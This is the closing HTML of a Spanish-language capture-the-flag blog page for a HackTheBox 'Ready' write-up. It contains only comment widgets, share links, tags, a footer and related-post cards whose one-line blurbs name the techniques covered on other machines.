            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>
     
    <div class="clearfix"></div>              
    </div>    
</div>       


<!-- Share -->
<div class="share">
    <p>
        Vacios
    </p>
    <ul>
        <li class="ml-1 mr-1">
            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Ready&url=http://localhost:4000/htb/ready" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                <i class="fab fa-twitter"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fas fa-cube"></i>
            </a>
        </li>

        <li class="ml-1 mr-1">
            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
                <i class="fab fa-github"></i>
            </a>
        </li>

    </ul>
</div>


<!-- Related Post -->
<!-- Related Posts
================================================== -->
<div class=" related-posts ">  

    
    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
    
    
    <div class="d-flex justify-content-center align-items-center">

    <!-- Tags -->  
    
                    
    <a class="smoothscroll badge badge-primary" href="/tags#docker">docker</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#gitlab">gitlab</a>               
                    
    <a class="smoothscroll badge badge-primary" href="/tags#ssh-keys">ssh-keys</a>               
    
    
    <!-- Categories -->
    
    
    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
    

    </div>

    
    
    
    <div class="blog-grid-container">
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/waldo">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/waldo/149banner.png" alt="HackTheBox - Waldo"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/waldo">HackTheBox - Waldo</a>
                
            </h2>
            <h4 class="card-text">Máquina linux nivel medio. Los lindos LFI, jugueteo con SSH, llaves privadas traviesas, bypass de shells restringidas yyyyyy cositas con las CAPAcidades BILITIESas.

</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">09 Aug 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/thenotebook">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/thenotebook/320banner.png" alt="HackTheBox - TheNotebook"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/thenotebook">HackTheBox - TheNotebook</a>
                
            </h2>
            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos el mundo de los JSON Web Tokens para ingresar a una web con permisos administrativos. Jugaremos con llaves SSH y romperemos el siempre fiel Docker...</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">31 Jul 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
        
        
        
            
            
        
            
        
            
            <!-- begin post -->


<div class="blog-grid-item">
    <div class="card h-100">
        <div class="maxthumb">
            <a href="/htb/tenet">
                

                    
                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/tenet/309banner.png" alt="HackTheBox - Tenet"> 
                    

                
            </a>
        </div>
        <div class="card-body">
            <h2 class="card-title">
                <a class="text-dark" href="/htb/tenet">HackTheBox - Tenet</a>
                
            </h2>
            <h4 class="card-text">Máquina Linux nivel medio. Exploraremos deserialización insegura de objetos en PHP, reutilización de contraseñas y encontraremos pequeños fallos en scripts de bash :P

</h4>
        </div>
        <div class="card-footer bg-white">
            <div class="wrapfooter">
                
                <span class="meta-footer-thumb">
                
                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
                
                </span>
                <span class="author-meta">
                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
                
                <span class="post-date">12 Jun 2021</span>
                </span>
                <div class="clearfix"></div>
            </div>
        </div>
    </div>
</div>
<!-- end post -->
            
            
                
        </div>        
</div>

<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
https://search.google.com/structured-data/testing-tool/u/0/
================================================== -->

    </div>

    
    <!-- Newsletter
    ================================================== -->
    <div class="newsletter text-center">
        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
        <p></p>
    </div>
    
    
</div>

<!-- Begin Footer
================================================== -->
<footer class="footer">
    <div class="container">
        <div class="row">
            <div class="col-md-6 col-sm-12 text-center text-lg-left">
                Copyright © 2022 Sh0x blog 
            </div>
            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
            </div>
        </div>
    </div>
</footer>
<!-- End Footer
================================================== -->

</div> <!-- /.site-content -->

<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
================================================== -->

<script src="/assets/js/prism.js"></script>

<script src="/assets/js/theme.js"></script>




<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>


</body>
</html>
